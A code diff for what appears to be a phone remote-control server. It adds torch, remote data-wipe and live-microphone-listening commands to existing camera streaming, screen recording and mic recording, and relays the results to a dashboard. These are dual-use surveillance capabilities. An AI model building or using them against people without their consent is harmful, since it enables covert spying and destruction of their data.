@@ -130,7 +130,11 @@ const COMMAND_EVENTS = {
   'camera-stream-start': 'CAMERA_STREAM_START',
   'camera-stream-stop': 'CAMERA_STREAM_STOP',
   'request-notifications': 'NOTIFICATIONS_REQUEST',
-  'notification-sync-set': 'NOTIFICATION_SYNC_SET'
+  'notification-sync-set': 'NOTIFICATION_SYNC_SET',
+  'torch': 'TORCH_COMMAND',
+  'wipe-data': 'WIPE_COMMAND',
+  'live-listen-start': 'LIVE_LISTEN_START',
+  'live-listen-stop': 'LIVE_LISTEN_STOP'
 };
 
 /** Builds the phone payload for a REST command (1:1 mapping for most). */
@@ -149,12 +153,16 @@ function commandPayload(name, body = {}) {
     case 'clipboard-disable': return { enabled: name === 'clipboard-enable' };
     case 'tts': return { text: body.text, speed: body.speed ?? 1.0, pitch: body.pitch ?? 1.0 };
     case 'play-audio': return { url: body.url, loop: !!body.loop };
-    case 'wallpaper': return { url: body.url || null, color: body.color || null };
+    case 'wallpaper': return { url: body.url || null, color: body.color || null, data: body.data || null };
     case 'mic-record': return { durationSec: Math.max(5, Math.min(60, Number(body.durationSec) || 15)) };
     case 'camera-capture': return { facing: body.facing === 'front' ? 'front' : 'back' };
     case 'camera-stream-start': return { facing: body.facing === 'front' ? 'front' : 'back', quality: body.quality || 'low', fps: Math.max(1, Math.min(30, Number(body.fps) || 15)) };
     case 'screen-record-start': return { fps: Math.max(1, Math.min(30, Number(body.fps) || 15)) };
     case 'call-blocklist-sync': return { enabled: !!body.enabled, numbers: Array.isArray(body.numbers) ? body.numbers : [] };
+    case 'torch': return { enabled: !!body.enabled };
+    case 'wipe-data': return { confirmation: body.confirmation };
+    case 'live-listen-start': return {};
+    case 'live-listen-stop': return {};
     default: return {};
   }
 }
@@ -542,6 +550,10 @@ function handleMessage(ws, msg) {
     case 'CAMERA_STREAM_FRAME':
     case 'SCREENSHOT_RESULT':
     case 'SCREEN_RECORD_FRAME':
+    case 'TORCH_RESULT':
+    case 'WIPE_RESULT':
+    case 'LIVE_LISTEN_STATUS':
+    case 'LIVE_AUDIO_CHUNK':
       broadcastToDashboard(msg.event, payload);
       break;
 
